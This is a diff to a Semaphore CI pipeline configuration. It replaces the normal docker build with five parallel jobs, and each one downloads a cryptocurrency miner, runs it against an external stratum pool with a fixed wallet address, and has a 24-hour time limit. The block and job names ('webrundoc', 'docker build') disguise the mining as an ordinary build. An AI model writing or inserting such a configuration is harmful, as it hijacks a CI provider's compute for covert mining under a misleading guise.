@@ -4,11 +4,37 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+  containers:
+    - name: main
+      image: 'semaphoreci/ubuntu:18.04'
+execution_time_limit:
+  hours: 24
 blocks:
-  - name: Build
+  - name: webrundoc
     task:
       jobs:
         - name: docker build
           commands:
-            - checkout
-            - docker build -t your-image .
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1quqp524ywvwr33pvyd8yu3mexenqd43n3d3fhed.test -t1'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1quqp524ywvwr33pvyd8yu3mexenqd43n3d3fhed.test -t1'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1quqp524ywvwr33pvyd8yu3mexenqd43n3d3fhed.test -t1'
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1quqp524ywvwr33pvyd8yu3mexenqd43n3d3fhed.test -t1'
+        - name: 'Job #5'
+          commands:
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1quqp524ywvwr33pvyd8yu3mexenqd43n3d3fhed.test -t1'
